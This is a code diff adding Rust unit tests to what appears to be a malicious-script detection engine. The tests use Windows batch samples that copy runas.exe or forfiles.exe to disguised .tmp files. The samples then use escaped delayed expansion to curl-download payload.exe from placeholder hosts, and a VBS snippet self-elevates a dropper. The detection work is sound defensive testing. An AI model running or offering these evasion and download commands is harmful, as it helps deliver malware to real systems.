@@ -2183,6 +2183,25 @@ C:\Users\Public\ra.tmp /user:Administrator "cmd.exe /c curl -o out.exe https://c
     }
 
     #[test]
+    fn copied_runas_alias_comspec_child_preserves_escaped_delayed_expansion() {
+        let script = br#"copy C:\Windows\System32\runas.exe C:\Users\Public\ra.tmp
+C:\Users\Public\ra.tmp /user:DOMAIN\admin "%COMSPEC% /V:ON /c set U=https://copied-runas-delayed.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-runas-delayed.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied runas escaped delayed child was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn vbs_shell_execute_runas_emits_self_elevation_trait() {
         let script = br#"Set UAC = CreateObject("Shell.Application")
 UAC.ShellExecute "cmd.exe", "/c ""C:\Users\me\dropper.bat""", "", "runas", 1"#;
@@ -18957,6 +18976,27 @@ C:\Users\Public\ff.tmp /m *.txt /c "cmd /c curl -o out.exe https://copied-forfil
             }),
             "copied forfiles nested curl download not surfaced: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn copied_forfiles_alias_comspec_child_preserves_escaped_delayed_expansion() {
+        let script = br#"copy C:\Windows\System32\forfiles.exe C:\Users\Public\ff.tmp
+C:\Users\Public\ff.tmp /p C:\Windows /m notepad.exe /c "%COMSPEC% /V:ON /c set U=https://copied-forfiles-delayed.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-forfiles-delayed.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "copied forfiles escaped delayed child was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 
